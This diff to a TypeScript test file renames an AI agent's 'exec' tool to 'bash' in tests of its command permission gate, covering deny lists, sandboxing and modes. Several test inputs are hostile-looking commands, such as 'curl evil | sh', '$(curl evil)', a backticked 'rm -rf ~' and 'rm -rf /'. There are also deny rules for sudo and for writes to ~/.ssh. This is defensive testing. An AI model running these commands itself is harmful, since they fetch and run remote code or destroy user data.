@@ -9,13 +9,13 @@ const tc = (name: string, args: unknown): ToolCallBlock => ({
   id: "blk_1", type: "tool_call", callId: "call_1", name, args, argsJson: JSON.stringify(args ?? {}),
 })
 
-const CFG = { allow: ["exec:git status", "exec:git diff*"], deny: ["exec:sudo*", "fs_write:~/.ssh/**"], confirmTimeoutMs: 1000, sessionGrants: true }
+const CFG = { allow: ["bash:git status", "bash:git diff*"], deny: ["bash:sudo*", "fs_write:~/.ssh/**"], confirmTimeoutMs: 1000, sessionGrants: true }
 
 // 内置工具的注册事实表（等价于 run-assembly 的现场派生：工具名 + risk + schema
 // 参数字段名）。测试用它构造 gate，使工具按"已注册"的处理方式参与裁决。
 const F = (risk: "safe" | "sensitive", ...argFields: string[]) => ({ risk, argFields })
 const BUILTIN_FACTS = new Map([
-  ["exec", F("sensitive", "command")],
+  ["bash", F("sensitive", "command")],
   ["fs_read", F("safe", "path")],
   ["fs_list", F("safe", "path")],
   ["fs_write", F("sensitive", "path")],
@@ -24,7 +24,7 @@ const BUILTIN_FACTS = new Map([
 
 describe("compileRule/globMatch", () => {
   it("parses tool-scoped and bare rules", () => {
-    expect(compileRule("exec:git diff*")).toEqual({ tool: "exec", argGlob: "git diff*" })
+    expect(compileRule("bash:git diff*")).toEqual({ tool: "bash", argGlob: "git diff*" })
     expect(compileRule("memory_search")).toEqual({ tool: "memory_search" })
   })
   it("globs * across segments", () => {
@@ -77,62 +77,62 @@ describe("ConfigPermissionGate", () => {
 
   it("deny short-circuits without confirmation", async () => {
     const g = new ConfigPermissionGate(CFG, { toolFacts: BUILTIN_FACTS, safeTools: new Set(["fs_read"]) })
-    const d = await g.check(tc("exec", { command: "sudo rm x" }))
+    const d = await g.check(tc("bash", { command: "sudo rm x" }))
     expect(d).toMatchObject({ type: "deny", reason: "blacklist" })
   })
   it("allow whitelist / safe tool / session grant ordered correctly", async () => {
     const grants = new SessionGrants()
     const g = new ConfigPermissionGate(CFG, { toolFacts: BUILTIN_FACTS, safeTools: new Set(["fs_read"]), grants })
-    expect(await g.check(tc("exec", { command: "git status" }))).toMatchObject({ type: "allow", reason: "whitelist" })
+    expect(await g.check(tc("bash", { command: "git status" }))).toMatchObject({ type: "allow", reason: "whitelist" })
     expect(await g.check(tc("fs_read", { path: "/tmp/x" }))).toMatchObject({ type: "allow", reason: "safe" })
-    grants.grant("exec:npm test")
-    expect(await g.check(tc("exec", { command: "npm test" }))).toMatchObject({ type: "allow", reason: "session_grant" })
+    grants.grant("bash:npm test")
+    expect(await g.check(tc("bash", { command: "npm test" }))).toMatchObject({ type: "allow", reason: "session_grant" })
   })
   it("auto mode does NOT consult run grants: a granted call still confirms (induction must see human approvals)", async () => {
     // batch C semantics preserved: auto learns from once approvals — a run
     // grant would hide the repetitions the counter needs. Even a populated
     // grant store is ignored in auto mode.
     const grants = new SessionGrants()
-    grants.grant("exec:npm test")
+    grants.grant("bash:npm test")
     const g = new ConfigPermissionGate(CFG, {
       toolFacts: BUILTIN_FACTS, safeTools: new Set(), grants, mode: "auto",
     })
-    expect(await g.check(tc("exec", { command: "npm test" }))).toMatchObject({ type: "confirm" })
+    expect(await g.check(tc("bash", { command: "npm test" }))).toMatchObject({ type: "confirm" })
   })
   it("falls through to confirm with fresh confirmationId", async () => {
     const g = new ConfigPermissionGate(CFG, { toolFacts: BUILTIN_FACTS, safeTools: new Set() })
-    const d = await g.check(tc("exec", { command: "curl example.com" }))
+    const d = await g.check(tc("bash", { command: "curl example.com" }))
     expect(d.type).toBe("confirm")
     expect((d as { confirmationId: string }).confirmationId).toMatch(/^conf_/)
   })
-  it("sandboxed exec: default mode auto-passes an otherwise-confirm command as sandboxed", async () => {
+  it("sandboxed bash: default mode auto-passes an otherwise-confirm command as sandboxed", async () => {
     const g = new ConfigPermissionGate(CFG, {
-      toolFacts: BUILTIN_FACTS, safeTools: new Set(), sandboxedTools: new Set(["exec"]),
+      toolFacts: BUILTIN_FACTS, safeTools: new Set(), sandboxedTools: new Set(["bash"]),
     })
     // no rule hits → would confirm → sandbox available → sandboxed allow
-    expect(await g.check(tc("exec", { command: "curl example.com" }))).toMatchObject({ type: "allow", reason: "sandboxed" })
+    expect(await g.check(tc("bash", { command: "curl example.com" }))).toMatchObject({ type: "allow", reason: "sandboxed" })
     // multi-segment lines (no allow/grant coverage) are sandboxed too: the
     // whole shell call runs inside the sandbox
-    expect(await g.check(tc("exec", { command: "git status; echo hi" }))).toMatchObject({ type: "allow", reason: "sandboxed" })
+    expect(await g.check(tc("bash", { command: "git status; echo hi" }))).toMatchObject({ type: "allow", reason: "sandboxed" })
   })
   it("sandbox unavailable: the same commands still go to confirm (fail-closed)", async () => {
     const g = new ConfigPermissionGate(CFG, { toolFacts: BUILTIN_FACTS, safeTools: new Set() })
-    expect(await g.check(tc("exec", { command: "curl example.com" }))).toMatchObject({ type: "confirm" })
-    expect(await g.check(tc("exec", { command: "git status; echo hi" }))).toMatchObject({ type: "confirm" })
+    expect(await g.check(tc("bash", { command: "curl example.com" }))).toMatchObject({ type: "confirm" })
+    expect(await g.check(tc("bash", { command: "git status; echo hi" }))).toMatchObject({ type: "confirm" })
   })
   it("a command-field tool NOT wrapped in the sandbox never auto-passes as sandboxed", async () => {
     // A hypothetical schema-`command` adapter tool (MCP etc.): sandbox
-    // available but the assembly only wraps exec — the sandboxed auto-pass
+    // available but the assembly only wraps bash — the sandboxed auto-pass
     // must not claim an unwrapped tool is sandboxed.
     const facts = new Map([["mcp__shell__do", F("sensitive", "command")]])
     // default mode: falls back to a human confirmation, not a sandboxed allow
     const g = new ConfigPermissionGate({ ...CFG, allow: [], deny: [] }, {
-      toolFacts: facts, safeTools: new Set(), sandboxedTools: new Set(["exec"]),
+      toolFacts: facts, safeTools: new Set(), sandboxedTools: new Set(["bash"]),
     })
     expect(await g.check(tc("mcp__shell__do", { command: "ls" }))).toMatchObject({ type: "confirm" })
     // trusted mode (no human fallback): denied, never auto-passed unsandboxed
     const t = new ConfigPermissionGate({ ...CFG, allow: [], deny: [] }, {
-      toolFacts: facts, safeTools: new Set(), sandboxedTools: new Set(["exec"]), mode: "trusted",
+      toolFacts: facts, safeTools: new Set(), sandboxedTools: new Set(["bash"]), mode: "trusted",
     })
     const d = await t.check(tc("mcp__shell__do", { command: "ls" }))
     expect(d).toMatchObject({ type: "deny", reason: "mode" })
@@ -141,39 +141,39 @@ describe("ConfigPermissionGate", () => {
   it("confirm explains when the sandbox was attempted but unavailable", async () => {
     const g = new ConfigPermissionGate(CFG, {
       toolFacts: BUILTIN_FACTS, safeTools: new Set(),
-      sandboxUnavailableNote: "exec 沙箱不可用，本次操作需人工确认",
+      sandboxUnavailableNote: "bash 沙箱不可用，本次操作需人工确认",
     })
-    const d = await g.check(tc("exec", { command: "curl example.com" }))
-    expect(d).toMatchObject({ type: "confirm", noteText: "exec 沙箱不可用，本次操作需人工确认" })
+    const d = await g.check(tc("bash", { command: "curl example.com" }))
+    expect(d).toMatchObject({ type: "confirm", noteText: "bash 沙箱不可用，本次操作需人工确认" })
     // with the sandbox available the note never appears (auto-pass instead)
     const g2 = new ConfigPermissionGate(CFG, {
-      toolFacts: BUILTIN_FACTS, safeTools: new Set(), sandboxedTools: new Set(["exec"]),
-      sandboxUnavailableNote: "exec 沙箱不可用，本次操作需人工确认",
+      toolFacts: BUILTIN_FACTS, safeTools: new Set(), sandboxedTools: new Set(["bash"]),
+      sandboxUnavailableNote: "bash 沙箱不可用，本次操作需人工确认",
     })
-    expect(await g2.check(tc("exec", { command: "curl example.com" }))).toMatchObject({ type: "allow", reason: "sandboxed" })
+    expect(await g2.check(tc("bash", { command: "curl example.com" }))).toMatchObject({ type: "allow", reason: "sandboxed" })
   })
   it("sandboxed never overrides deny / whitelist / decided / session grants", async () => {
     const grants = new SessionGrants()
     const g = new ConfigPermissionGate(CFG, {
-      toolFacts: BUILTIN_FACTS, safeTools: new Set(), grants, sandboxedTools: new Set(["exec"]),
+      toolFacts: BUILTIN_FACTS, safeTools: new Set(), grants, sandboxedTools: new Set(["bash"]),
     })
     // deny still short-circuits (sudo in the default deny list)
-    expect(await g.check(tc("exec", { command: "sudo rm x" }))).toMatchObject({ type: "deny", reason: "blacklist" })
+    expect(await g.check(tc("bash", { command: "sudo rm x" }))).toMatchObject({ type: "deny", reason: "blacklist" })
     // an allow rule still wins with its own reason
-    expect(await g.check(tc("exec", { command: "git status" }))).toMatchObject({ type: "allow", reason: "whitelist" })
+    expect(await g.check(tc("bash", { command: "git status" }))).toMatchObject({ type: "allow", reason: "whitelist" })
     // a session grant still wins with its own reason
-    grants.grant("exec:npm test")
-    expect(await g.check(tc("exec", { command: "npm test" }))).toMatchObject({ type: "allow", reason: "session_grant" })
+    grants.grant("bash:npm test")
+    expect(await g.check(tc("bash", { command: "npm test" }))).toMatchObject({ type: "allow", reason: "session_grant" })
   })
-  it("readonly mode still short-circuits a sandboxable exec", async () => {
-    const g = new ConfigPermissionGate(CFG, { toolFacts: BUILTIN_FACTS, safeTools: new Set(), sandboxedTools: new Set(["exec"]), mode: "readonly" })
-    expect(await g.check(tc("exec", { command: "curl example.com" }))).toMatchObject({ type: "deny", reason: "readonly" })
+  it("readonly mode still short-circuits a sandboxable bash", async () => {
+    const g = new ConfigPermissionGate(CFG, { toolFacts: BUILTIN_FACTS, safeTools: new Set(), sandboxedTools: new Set(["bash"]), mode: "readonly" })
+    expect(await g.check(tc("bash", { command: "curl example.com" }))).toMatchObject({ type: "deny", reason: "readonly" })
   })
-  it("acceptEdits mode also auto-passes a sandboxable exec", async () => {
+  it("acceptEdits mode also auto-passes a sandboxable bash", async () => {
     const g = new ConfigPermissionGate(CFG, {
-      toolFacts: BUILTIN_FACTS, safeTools: new Set(), sandboxedTools: new Set(["exec"]), mode: "acceptEdits",
+      toolFacts: BUILTIN_FACTS, safeTools: new Set(), sandboxedTools: new Set(["bash"]), mode: "acceptEdits",
     })
-    expect(await g.check(tc("exec", { command: "curl example.com" }))).toMatchObject({ type: "allow", reason: "sandboxed" })
+    expect(await g.check(tc("bash", { command: "curl example.com" }))).toMatchObject({ type: "allow", reason: "sandboxed" })
   })
   it("fs_write deny matches globbed path from args.path", async () => {
     const g = new ConfigPermissionGate(CFG, { toolFacts: BUILTIN_FACTS, safeTools: new Set() })
@@ -386,7 +386,7 @@ describe("ConfigPermissionGate", () => {
   })
 })
 
-describe("exec command normalization", () => {
+describe("bash command normalization", () => {
   it("collapses whitespace and basenames the command token", () => {
     expect(normalizeCommand("rm  -rf   /tmp/x")).toBe("rm -rf /tmp/x")
     expect(normalizeCommand("/bin/rm -rf x")).toBe("rm -rf x")
@@ -398,7 +398,7 @@ describe("exec command normalization", () => {
     // 旗标重排与聚合旗标（原盲区）由 token 集合覆盖：deny 双路匹配
     // （legacy 字符串 glob OR token cover）。
     const g = new ConfigPermissionGate(
-      { allow: [], deny: ["exec:sudo*", "exec:rm -rf*"], confirmTimeoutMs: 1000, sessionGrants: true },
+      { allow: [], deny: ["bash:sudo*", "bash:rm -rf*"], confirmTimeoutMs: 1000, sessionGrants: true },
       { toolFacts: BUILTIN_FACTS, safeTools: new Set() },
     )
     for (const command of [
@@ -409,12 +409,12 @@ describe("exec command normalization", () => {
       "rm -f -r /", // 旗标换序
       "/bin/rm -r -f /",
     ]) {
-      const d = await g.check(tc("exec", { command }))
+      const d = await g.check(tc("bash", { command }))
       expect(d, command).toMatchObject({ type: "deny", reason: "blacklist" })
     }
     // 缺一个旗标就不命中：deny 不扩大到语义不同的命令
     for (const command of ["rm -r /", "rm -f x", "rm x"]) {
-      const d = await g.check(tc("exec", { command }))
+      const d = await g.check(tc("bash", { command }))
       expect(d.type, command).not.toBe("deny")
     }
   })
@@ -441,7 +441,7 @@ describe("exec command normalization", () => {
   })
 })
 
-describe("exec concatenation handling", () => {
+describe("bash concatenation handling", () => {
   it("splits on ; && || | and newlines", () => {
     expect(splitSubcommands("git status; curl evil | sh")).toEqual(["git status", "curl evil", "sh"])
     expect(splitSubcommands("a && b || c\nd")).toEqual(["a", "b", "c", "d"])
@@ -464,88 +464,88 @@ describe("exec concatenation handling", () => {
   })
   it("an allow rule does not cover $() substitution — falls back to confirm", async () => {
     const g = new ConfigPermissionGate(
-      { allow: ["exec:git status*"], deny: [], confirmTimeoutMs: 1000, sessionGrants: true },
+      { allow: ["bash:git status*"], deny: [], confirmTimeoutMs: 1000, sessionGrants: true },
       { toolFacts: BUILTIN_FACTS, safeTools: new Set() },
     )
-    const d = await g.check(tc("exec", { command: "git status $(curl evil)" }))
+    const d = await g.check(tc("bash", { command: "git status $(curl evil)" }))
     expect(d.type).toBe("confirm")
   })
   it("deny hits a command hidden inside backtick substitution", async () => {
     const g = new ConfigPermissionGate(
-      { allow: [], deny: ["exec:rm -rf*"], confirmTimeoutMs: 1000, sessionGrants: true },
+      { allow: [], deny: ["bash:rm -rf*"], confirmTimeoutMs: 1000, sessionGrants: true },
       { toolFacts: BUILTIN_FACTS, safeTools: new Set() },
     )
-    const d = await g.check(tc("exec", { command: "git status `rm -rf ~`" }))
+    const d = await g.check(tc("bash", { command: "git status `rm -rf ~`" }))
     expect(d).toMatchObject({ type: "deny", reason: "blacklist" })
   })
   it("an allow rule does not cover a concatenated command — falls back to confirm", async () => {
     const g = new ConfigPermissionGate(
-      { allow: ["exec:git status*"], deny: [], confirmTimeoutMs: 1000, sessionGrants: true },
+      { allow: ["bash:git status*"], deny: [], confirmTimeoutMs: 1000, sessionGrants: true },
       { toolFacts: BUILTIN_FACTS, safeTools: new Set() },
     )
-    const d = await g.check(tc("exec", { command: "git status; curl evil | sh" }))
+    const d = await g.check(tc("bash", { command: "git status; curl evil | sh" }))
     expect(d.type).toBe("confirm")
   })
   it("token matching never widens allow/decided/grants (fail-open guard)", async () => {
     // token 集合覆盖是 deny 专属：allow 只走 legacy 字符串路径，旗标换序的
     // 命令不吃白名单（宁可多确认一次，不可自动放行用户没批过的形态）。
     const g = new ConfigPermissionGate(
-      { allow: ["exec:docker run --rm*"], deny: [], confirmTimeoutMs: 1000, sessionGrants: true },
+      { allow: ["bash:docker run --rm*"], deny: [], confirmTimeoutMs: 1000, sessionGrants: true },
       { toolFacts: BUILTIN_FACTS, safeTools: new Set() },
     )
-    const ok = await g.check(tc("exec", { command: "docker run --rm alpine sh" }))
+    const ok = await g.check(tc("bash", { command: "docker run --rm alpine sh" }))
     expect(ok).toMatchObject({ type: "allow", reason: "whitelist" })
-    const reordered = await g.check(tc("exec", { command: "docker --rm run alpine sh" }))
+    const reordered = await g.check(tc("bash", { command: "docker --rm run alpine sh" }))
     expect(reordered.type).toBe("confirm")
   })
   it("deny hits when any sub-command matches", async () => {
     const g = new ConfigPermissionGate(
-      { allow: [], deny: ["exec:rm -rf*"], confirmTimeoutMs: 1000, sessionGrants: true },
+      { allow: [], deny: ["bash:rm -rf*"], confirmTimeoutMs: 1000, sessionGrants: true },
       { toolFacts: BUILTIN_FACTS, safeTools: new Set() },
     )
-    const d = await g.check(tc("exec", { command: "echo hi; rm -rf /tmp/x" }))
+    const d = await g.check(tc("bash", { command: "echo hi; rm -rf /tmp/x" }))
     expect(d).toMatchObject({ type: "deny", reason: "blacklist" })
   })
   it("session grants do not cover a concatenated command either", async () => {
     const grants = new SessionGrants()
-    grants.grant("exec:git status")
+    grants.grant("bash:git status")
     const g = new ConfigPermissionGate(
       { allow: [], deny: [], confirmTimeoutMs: 1000, sessionGrants: true },
       { toolFacts: BUILTIN_FACTS, safeTools: new Set(), grants },
     )
-    expect(await g.check(tc("exec", { command: "git status && make" }))).toMatchObject({ type: "confirm" })
-    expect(await g.check(tc("exec", { command: "git status" }))).toMatchObject({ type: "allow", reason: "session_grant" })
+    expect(await g.check(tc("bash", { command: "git status && make" }))).toMatchObject({ type: "confirm" })
+    expect(await g.check(tc("bash", { command: "git status" }))).toMatchObject({ type: "allow", reason: "session_grant" })
   })
   it("deny rule globs are normalized too (/bin/rm* ≡ rm*)", async () => {
     const g = new ConfigPermissionGate(
-      { allow: [], deny: ["exec:/bin/rm*"], confirmTimeoutMs: 1000, sessionGrants: true },
+      { allow: [], deny: ["bash:/bin/rm*"], confirmTimeoutMs: 1000, sessionGrants: true },
       { toolFacts: BUILTIN_FACTS, safeTools: new Set() },
     )
-    const d = await g.check(tc("exec", { command: "rm -rf /tmp/x" }))
+    const d = await g.check(tc("bash", { command: "rm -rf /tmp/x" }))
     expect(d).toMatchObject({ type: "deny", reason: "blacklist" })
   })
   it("a grant recorded from a raw double-spaced command still matches on retry", async () => {
-    // The grant store records rules verbatim from the raw command; the exec
+    // The grant store records rules verbatim from the raw command; the bash
     // branch normalizes BOTH sides, so double-space retries stop re-prompting.
     const grants = new SessionGrants()
-    grants.grant("exec:git  status")
+    grants.grant("bash:git  status")
     const g = new ConfigPermissionGate(
       { allow: [], deny: [], confirmTimeoutMs: 1000, sessionGrants: true },
       { toolFacts: BUILTIN_FACTS, safeTools: new Set(), grants },
     )
-    expect(await g.check(tc("exec", { command: "git  status" }))).toMatchObject({ type: "allow", reason: "session_grant" })
-    expect(await g.check(tc("exec", { command: "git status" }))).toMatchObject({ type: "allow", reason: "session_grant" })
+    expect(await g.check(tc("bash", { command: "git  status" }))).toMatchObject({ type: "allow", reason: "session_grant" })
+    expect(await g.check(tc("bash", { command: "git status" }))).toMatchObject({ type: "allow", reason: "session_grant" })
   })
-  it("non-exec rules never match exec calls (no cross-tool leakage)", async () => {
+  it("non-bash rules never match bash calls (no cross-tool leakage)", async () => {
     // A bare `fs_read` allow (or `memory_search` deny) is scoped to its own
-    // tool: without a tool check in the exec branch, the bare allow rule
+    // tool: without a tool check in the bash branch, the bare allow rule
     // would wave through every single-segment command, and the bare deny
     // would block them all.
     const g = new ConfigPermissionGate(
       { allow: ["fs_read"], deny: ["memory_search"], confirmTimeoutMs: 1000, sessionGrants: true },
       { toolFacts: BUILTIN_FACTS, safeTools: new Set() },
     )
-    expect((await g.check(tc("exec", { command: "curl example.com" }))).type).toBe("confirm")
+    expect((await g.check(tc("bash", { command: "curl example.com" }))).type).toBe("confirm")
   })
 })
 
@@ -574,7 +574,7 @@ describe("ConfigPermissionGate readRoots", () => {
     grants.grant("fs_write:~/.ssh/**")
     const g2 = new ConfigPermissionGate(CFG, { toolFacts: BUILTIN_FACTS, safeTools: new Set(["fs_read"]), workspace: ws, grants, mode: "readonly" })
     expect(await g2.check(tc("fs_write", { path: "~/x" }))).toMatchObject({ type: "deny", reason: "readonly" })
-    expect(await g2.check(tc("exec", { command: "git status" }))).toMatchObject({ type: "deny", reason: "readonly" })
+    expect(await g2.check(tc("bash", { command: "git status" }))).toMatchObject({ type: "deny", reason: "readonly" })
     expect(await g2.check(tc("fs_read", { path: join(ws, "a.txt") }))).toMatchObject({ type: "allow" })
     // read-class tools are untouched by readonly (memory_search is not in
     // safeTools here, so it falls through to confirm rather than deny)
@@ -606,10 +606,10 @@ describe("ConfigPermissionGate readRoots", () => {
       rmSync(ws, { recursive: true, force: true })
     })
 
-    it("acceptEdits never touches exec (still confirm), safe tools unchanged", async () => {
+    it("acceptEdits never touches bash (still confirm), safe tools unchanged", async () => {
       const ws = mkdtempSync(join(tmpdir(), "kclaw-gate-ae3-"))
       const g = new ConfigPermissionGate({ ...CFG, allow: [], deny: [] }, { toolFacts: BUILTIN_FACTS, safeTools: new Set(["fs_read"]), workspace: ws, mode: "acceptEdits" })
-      expect(await g.check(tc("exec", { command: "git status" }))).toMatchObject({ type: "confirm" })
+      expect(await g.check(tc("bash", { command: "git status" }))).toMatchObject({ type: "confirm" })
       expect(await g.check(tc("fs_read", { path: join(ws, "a") }))).toMatchObject({ type: "allow", reason: "safe" })
       rmSync(ws, { recursive: true, force: true })
     })
@@ -623,32 +623,32 @@ describe("ConfigPermissionGate readRoots", () => {
   })
 
   describe("trusted mode (batch C)", () => {
-    it("exec with the sandbox available auto-passes as sandboxed, multi-segment included", async () => {
+    it("bash with the sandbox available auto-passes as sandboxed, multi-segment included", async () => {
       const g = new ConfigPermissionGate({ ...CFG, allow: [], deny: [] }, {
-        toolFacts: BUILTIN_FACTS, safeTools: new Set(), sandboxedTools: new Set(["exec"]), mode: "trusted",
+        toolFacts: BUILTIN_FACTS, safeTools: new Set(), sandboxedTools: new Set(["bash"]), mode: "trusted",
       })
-      expect(await g.check(tc("exec", { command: "curl example.com" }))).toMatchObject({ type: "allow", reason: "sandboxed" })
+      expect(await g.check(tc("bash", { command: "curl example.com" }))).toMatchObject({ type: "allow", reason: "sandboxed" })
       // the whole shell call runs inside the sandbox, so chained lines pass too
-      expect(await g.check(tc("exec", { command: "git status; echo hi" }))).toMatchObject({ type: "allow", reason: "sandboxed" })
+      expect(await g.check(tc("bash", { command: "git status; echo hi" }))).toMatchObject({ type: "allow", reason: "sandboxed" })
     })
 
-    it("exec without the sandbox is DENIED, never confirmed (fail-closed: no human in the loop)", async () => {
+    it("bash without the sandbox is DENIED, never confirmed (fail-closed: no human in the loop)", async () => {
       const g = new ConfigPermissionGate({ ...CFG, allow: [], deny: [] }, {
         toolFacts: BUILTIN_FACTS, safeTools: new Set(), mode: "trusted",
       })
-      const d = await g.check(tc("exec", { command: "curl example.com" }))
+      const d = await g.check(tc("bash", { command: "curl example.com" }))
       expect(d).toMatchObject({ type: "deny", reason: "mode" })
       expect((d as { noteText?: string }).noteText).toContain("沙箱不可用")
     })
 
     it("deny blacklist still wins over the trust tier", async () => {
       const g = new ConfigPermissionGate(CFG, {
-        toolFacts: BUILTIN_FACTS, safeTools: new Set(), sandboxedTools: new Set(["exec"]), mode: "trusted",
+        toolFacts: BUILTIN_FACTS, safeTools: new Set(), sandboxedTools: new Set(["bash"]), mode: "trusted",
       })
-      expect(await g.check(tc("exec", { command: "sudo rm x" }))).toMatchObject({ type: "deny", reason: "blacklist" })
+      expect(await g.check(tc("bash", { command: "sudo rm x" }))).toMatchObject({ type: "deny", reason: "blacklist" })
       expect(await g.check(tc("fs_write", { path: "~/.ssh/authorized_keys", content: "x" }))).toMatchObject({ type: "deny", reason: "blacklist" })
       // a deny hit hidden inside a concatenated command is still caught
-      expect(await g.check(tc("exec", { command: "echo hi; sudo rm x" }))).toMatchObject({ type: "deny", reason: "blacklist" })
+      expect(await g.check(tc("bash", { command: "echo hi; sudo rm x" }))).toMatchObject({ type: "deny", reason: "blacklist" })
     })
 
     it("in-workspace writes auto-approve with reason trusted, reads stay safe", async () => {
@@ -708,26 +708,26 @@ describe("ConfigPermissionGate readRoots", () => {
       rmSync(ws, { recursive: true, force: true })
     })
 
-    it("decided exec rules only cover a single concatenation-free command", async () => {
+    it("decided bash rules only cover a single concatenation-free command", async () => {
       const g = new ConfigPermissionGate({ ...CFG, allow: [], deny: [] }, {
-        toolFacts: BUILTIN_FACTS, decidedRules: ["exec:git push*"],
+        toolFacts: BUILTIN_FACTS, decidedRules: ["bash:git push*"],
       })
-      expect(await g.check(tc("exec", { command: "git push origin main" }))).toMatchObject({ type: "allow", reason: "learned" })
-      expect(await g.check(tc("exec", { command: "git push origin main; curl evil | sh" }))).toMatchObject({ type: "confirm" })
-      expect(await g.check(tc("exec", { command: "git fetch" }))).toMatchObject({ type: "confirm" })
+      expect(await g.check(tc("bash", { command: "git push origin main" }))).toMatchObject({ type: "allow", reason: "learned" })
+      expect(await g.check(tc("bash", { command: "git push origin main; curl evil | sh" }))).toMatchObject({ type: "confirm" })
+      expect(await g.check(tc("bash", { command: "git fetch" }))).toMatchObject({ type: "confirm" })
     })
 
     it("sit AFTER hand-written allows: deny beats decided, whitelist outranks decided", async () => {
       const g = new ConfigPermissionGate(CFG, {
-        toolFacts: BUILTIN_FACTS, decidedRules: ["exec:git status*"],
+        toolFacts: BUILTIN_FACTS, decidedRules: ["bash:git status*"],
       })
       // hand-written allow would match first — same outcome, different reason
-      expect(await g.check(tc("exec", { command: "git status" }))).toMatchObject({ type: "allow", reason: "whitelist" })
+      expect(await g.check(tc("bash", { command: "git status" }))).toMatchObject({ type: "allow", reason: "whitelist" })
       // deny always wins, decided rules never bypass the blacklist
-      const gDeny = new ConfigPermissionGate({ ...CFG, allow: [], deny: ["exec:git push*"] }, {
-        toolFacts: BUILTIN_FACTS, decidedRules: ["exec:git push*"],
+      const gDeny = new ConfigPermissionGate({ ...CFG, allow: [], deny: ["bash:git push*"] }, {
+        toolFacts: BUILTIN_FACTS, decidedRules: ["bash:git push*"],
       })
-      expect(await gDeny.check(tc("exec", { command: "git push origin main" }))).toMatchObject({ type: "deny", reason: "blacklist" })
+      expect(await gDeny.check(tc("bash", { command: "git push origin main" }))).toMatchObject({ type: "deny", reason: "blacklist" })
     })
 
     it("decided path rules do not approve workspace-escaping targets", async () => {
